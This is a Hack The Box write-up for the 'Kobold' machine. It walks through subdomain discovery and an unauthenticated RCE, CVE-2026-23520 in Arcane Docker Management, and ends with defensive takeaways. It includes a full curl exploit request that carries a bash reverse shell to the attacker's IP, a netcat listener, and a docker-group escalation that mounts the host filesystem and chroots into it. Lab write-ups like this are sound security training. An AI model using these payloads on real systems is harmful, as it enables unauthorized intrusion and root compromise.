# HTB Write-Up: Kobold

| Field      | Details          |
|------------|------------------|
| Platform   | Hack The Box     |
| Difficulty | Easy             |
| OS         | Linux            |
| Author     | shreekara        |
| Date       | June 11, 2026    |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — Subdomain Discovery & Version Fingerprinting](#2-enumeration--subdomain-discovery--version-fingerprinting)
3. [Initial Access — CVE-2026-23520 (Arcane Docker Management RCE)](#3-initial-access--cve-2026-23520-arcane-docker-management-rce)
4. [Privilege Escalation — Docker Socket Abuse](#4-privilege-escalation--docker-socket-abuse)
5. [Summary & Takeaways](#5-summary--takeaways)

---

## 1. Reconnaissance

Starting as usual with a targeted port scan:

```bash
sudo nmap -sC -sV 10.129.1.254 -p22,80,443
```

Three ports open:

| Port | Service | Details          |
|------|---------|------------------|
| 22   | SSH     | OpenSSH (Ubuntu) |
| 80   | HTTP    | Web server       |
| 443  | HTTPS   | Web server (TLS) |

Nothing surprising. SSH is useless without credentials, so the web server is where to start. Added `kobold.htb` to `/etc/hosts` and moved on.

---

## 2. Enumeration — Subdomain Discovery & Version Fingerprinting

### 2.1 — Virtual Host Enumeration

The main `kobold.htb` page didn't have much going on, so I ran a vhost bruteforce with Gobuster to check for any subdomains hiding behind the same server:

```bash
gobuster vhost -u "https://kobold.htb" \
  -w bitquark-subdomains-top100000.txt \
  --append-domain \
  --no-tls-validation
```

```
mcp.kobold.htb   Status: 200 [Size: 466]
bin.kobold.htb   Status: 200 [Size: 24402]
```

Two subdomains. Added both to `/etc/hosts` and opened them up.

### 2.2 — Identifying the Services

**`bin.kobold.htb`** — a PrivateBin instance. Interesting to note but nothing immediately exploitable here, so I parked it.

**`mcp.kobold.htb`** — this one was more interesting. It was running a panel I hadn't seen before. The UI showed "MCPJam" with an MCP Servers interface:

<img width="1918" height="967" alt="Screenshot 2026-06-10 232238" src="https://github.com/user-attachments/assets/ca36c5a8-42da-49ac-a63c-4aa65b793ea0" />

I had to do a bit of research to figure out what this actually was. Digging through the page source, I found a version string referencing **Arcane Docker Management v1.13.0** — that's the underlying software the panel was built on. Once I had that name and version, things moved quickly.

### 2.3 — CVE Research

Searching for "Arcane Docker Management CVE" immediately turned up **CVE-2026-23520** — a critical unauthenticated RCE affecting v1.13.0 and below. That matched exactly what was running here.

| CVE              | Service                    | Version   | Impact                                        | Severity |
|------------------|----------------------------|-----------|-----------------------------------------------|----------|
| CVE-2026-23520   | Arcane Docker Management   | ≤ v1.13.0 | Unauthenticated RCE via `/api/mcp/connect`    | CRITICAL |

---

## 3. Initial Access — CVE-2026-23520 (Arcane Docker Management RCE)

### 3.1 — How the Vulnerability Works

The `/api/mcp/connect` endpoint takes a JSON body with a `serverConfig` object that specifies a `command` and `args` to run server-side. No authentication, no input validation — an attacker just passes in a shell command and it executes. About as straightforward as RCE gets.

### 3.2 — Setting Up the Listener

```bash
nc -lvnp 4444
```

```
listening on [any] 4444 ...
```

### 3.3 — Triggering the Exploit

For the reverse shell payload I grabbed the standard bash TCP one-liner from the [pentestmonkey cheat sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and dropped it straight into the `args` field:

```bash
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverId": "shell1",
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/10.10.14.194/4444 0>&1"],
      "env": {}
    }
  }'
```

Shell came back almost immediately:

```
connect to [10.10.14.194] from (UNKNOWN) [10.129.1.254] 54312
ben@kobold:~$ id
uid=1001(ben) gid=1001(ben) groups=1001(ben)
```

In as `ben`.

### 3.4 — User Flag

With the shell landed, first thing I did was grab the user flag before anything else:

```bash
ben@kobold:~$ cat user.txt
```
<img width="812" height="581" alt="Screenshot 2026-06-10 225455" src="https://github.com/user-attachments/assets/f8a8eff3-3ea8-47a4-83f1-884d3c141ec3" />

The shell was pretty unusable at this point — no tab completion, no arrow keys, Ctrl+C would kill the whole session. My internet also gave up around here so I called it for the night and came back to it the next morning.

### 3.5 — Stabilizing the Shell

Back on it the next day. First order of business was upgrading to a proper TTY before touching anything else:

```bash
# Spawn a PTY
ben@kobold:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background it, fix local terminal
ben@kobold:~$ ^Z
$ stty raw -echo; fg

# Fix terminal rendering
ben@kobold:~$ export TERM=xterm
```

Proper interactive shell now. Time to look for a privesc path.

---

## 4. Privilege Escalation — Docker Socket Abuse

### 4.1 — Poking Around

First thing after stabilizing — basic enumeration. Noticed Docker was running on the box:

```bash
ben@kobold:~$ docker ps
permission denied while trying to connect to the Docker daemon socket at
unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.50/containers/json":
dial unix /var/run/docker.sock: connect: permission denied
```

Permission denied — but before giving up, I checked `id` properly. `ben` is actually in the `docker` group, the active group just wasn't set to it yet. `newgrp` sorts that out for the current session:

```bash
ben@kobold:~$ newgrp docker
ben@kobold:~$ docker ps
CONTAINER ID   IMAGE                                    COMMAND                  CREATED       STATUS      PORTS                      NAMES
4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2        "/etc/init.d/rc.local"   5 weeks ago   Up 2 hours  127.0.0.1:8080->8080/tcp   bin
```

One container running — the PrivateBin instance from earlier. More usefully, the image `privatebin/nginx-fpm-alpine:2.0.2` is already pulled locally. That's the one I'm going to use.

### 4.2 — Mounting the Host Filesystem

Access to the Docker socket is root on the host — full stop. The move here is to spin up a container as root with the entire host filesystem mounted inside it:

```bash
ben@kobold:~$ docker run --rm -it -u 0 \
  --entrypoint sh \
  -v /:/mnt \
  privatebin/nginx-fpm-alpine:2.0.2
/ #
```

Inside a root container with the host's full filesystem accessible at `/mnt`.

### 4.3 — chroot Into the Host

```bash
/ # chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

Root on the actual machine. Root flag is at `/root/root.txt`.

---
<img width="878" height="563" alt="Screenshot 2026-06-11 111941" src="https://github.com/user-attachments/assets/7bc6eef9-565d-425d-9a95-a17036be1790" />

## 5. Summary & Takeaways

### Attack Chain

| Phase                | Technique                                                              | Result                                      |
|----------------------|------------------------------------------------------------------------|---------------------------------------------|
| Recon                | `nmap -sC -sV`                                                         | Ports 22, 80, 443 identified                |
| Subdomain Enum       | `gobuster vhost`                                                       | `mcp.kobold.htb`, `bin.kobold.htb` found    |
| Fingerprinting       | Page source → Arcane Docker Management v1.13.0 → CVE-2026-23520        | Critical unauthenticated RCE identified     |
| Initial Access       | CVE-2026-23520 — `curl` POST to `/api/mcp/connect`                    | Shell as `ben` + user flag                  |
| Privilege Escalation | `newgrp docker` → mount host `/` into container → `chroot`            | Root shell + root flag                      |

### What I Took Away From This Box

**Always check group memberships properly.** My first `docker ps` came back with permission denied and I almost moved on. Checking `id` properly showed `ben` was already in the `docker` group — `newgrp` was all it took. It's a quick check that's easy to skip when you're moving fast.

**Version strings in page source are worth hunting for.** The MCPJam UI didn't immediately tell me what was running underneath. I had to dig into the page source to find the Arcane Docker Management version string. That one line of source led directly to the CVE. Always read the source.

**Docker group membership is root.** If a user is in the `docker` group, they can mount the host filesystem into a privileged container and `chroot` right in — no SUID, no sudo, no kernel exploit needed. The `docker` group should be treated exactly like `sudo`. On any real system, direct socket access for application users should be locked down or replaced with a rootless Docker setup.

**Unauthenticated command execution endpoints should never exist in production.** The `/api/mcp/connect` endpoint ran whatever command you handed it with zero auth. It didn't matter how "internal" the panel felt — it was network-accessible, and that made it an instant critical.
